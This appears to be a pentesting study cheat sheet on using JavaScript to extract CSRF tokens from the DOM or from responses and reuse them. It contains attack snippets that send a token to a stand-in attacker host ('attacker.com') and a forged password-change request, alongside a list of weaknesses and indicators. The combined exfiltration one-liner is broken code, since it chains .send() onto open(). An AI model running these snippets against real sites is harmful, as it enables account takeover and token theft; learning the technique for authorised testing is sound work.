## JavaScript for Pentesters — Extracting & Stealing CSRF Tokens

## Objective
Use JavaScript to:
- Locate CSRF tokens
- Extract them from the DOM or responses
- Reuse them to perform authenticated actions

Think: *“Where is the token stored—and can I grab it before it’s used?”*

---

## 1. Where CSRF Tokens Are Found

- Hidden form fields
- Meta tags
- JavaScript variables
- HTTP responses (HTML / JSON)

---

### Common patterns

```html
<input type="hidden" name="csrf_token" value="abc123">
```

```html
<meta name="csrf-token" content="abc123">
```

---

## 2. Extracting CSRF Tokens (DOM)

### A. From hidden input

```javascript
var token = document.querySelector('input[name="csrf_token"]').value;
console.log(token);
```

---

### B. From meta tag

```javascript
var token = document.querySelector('meta[name="csrf-token"]').content;
```

---

### C. From cookies (if used)

```javascript
document.cookie
```

---

## 3. Extracting CSRF from XHR Response

### Example

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/form", true);

xhr.onload = function() {
  var parser = new DOMParser();
  var doc = parser.parseFromString(xhr.responseText, "text/html");

  var token = doc.querySelector('input[name="csrf_token"]').value;
  console.log(token);
};

xhr.send();
```

---

## 4. CSRF Token Stealing (Exfiltration)

### Send token to attacker

```javascript
var token = document.querySelector('input[name="csrf_token"]').value;

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://attacker.com/collect", true);
xhr.send(token);
```

---

### Combined extraction + exfiltration

```javascript
var t = document.querySelector('input[name="csrf_token"]').value;

new XMLHttpRequest().open("POST","https://attacker.com",true).send(t);
```

---

## 5. Using Stolen Token

### Example forged request

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/change-password", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.send("password=hacked&csrf_token=" + token);
```

---

## 6. Common Weaknesses

- Token stored in DOM (accessible via JS)
- Token reused across requests
- Token predictable or static
- No binding to session

---

## 7. Indicators of Vulnerability

- Token easily accessible via JS
- Same token reused
- Token accepted without validation
- No token required for sensitive action

---

## 8. Fast Workflow (Exam Mode)

1. Identify CSRF-protected action
2. Locate token:
   - input
   - meta
   - response
3. Extract token via JS
4. Test:
   - reuse token
   - send forged request
5. Optionally exfiltrate token
6. Confirm bypass

---

## 9. Mental Model

CSRF protection relies on secrecy.

If JavaScript can access the token:
→ It is no longer secret  

If you can read it:
→ You can reuse it  
→ You can bypass protection